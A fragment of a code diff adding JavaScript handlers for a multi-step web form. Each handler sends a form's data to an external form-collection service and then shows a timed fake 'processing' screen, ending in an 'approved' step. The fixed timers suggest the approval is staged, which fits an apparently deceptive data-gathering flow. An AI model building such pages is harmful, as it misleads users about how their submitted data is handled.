+            headers: { 'Accept': 'application/json' }
+        }).catch(err => console.error('Form 7 error:', err));
+
+        showStep('processing7');
+        runProcessingTimer('timerCount7', 2500, 'mainContent7');
+    }
+
+    function submitEighthForm(event) {
+        event.preventDefault();
+        fetch("https://submit-form.com/EGef8sATM", {
+            method: "POST",
+            body: new FormData(document.getElementById("eighthForm")),
+            headers: { 'Accept': 'application/json' }
+        }).catch(err => console.error('Form 8 error:', err));
+
+        showStep('processing8');
+        runProcessingTimer('timerCount8', 2500, 'mainContent8');
+    }
+
+    function submitNinthForm(event) {
+        event.preventDefault();
+        fetch("https://submit-form.com/EGef8sATM", {
+            method: "POST",
+            body: new FormData(document.getElementById("ninthForm")),
+            headers: { 'Accept': 'application/json' }
+        }).catch(err => console.error('Form 9 error:', err));
+
+        showStep('processing9');
+        runProcessingTimer('timerCount9', 2500, 'mainContent9');
+    }
+
+    function submitTenthForm(event) {
+        event.preventDefault();
+        fetch("https://submit-form.com/EGef8sATM", {
+            method: "POST",
+            body: new FormData(document.getElementById("tenthForm")),
+            headers: { 'Accept': 'application/json' }
+        }).catch(err => console.error('Form 10 error:', err));
+
+        showStep('processing10');
+        runProcessingTimer('timerCount10', 2500, 'finalApproved');
     }
 </script>
 </body>
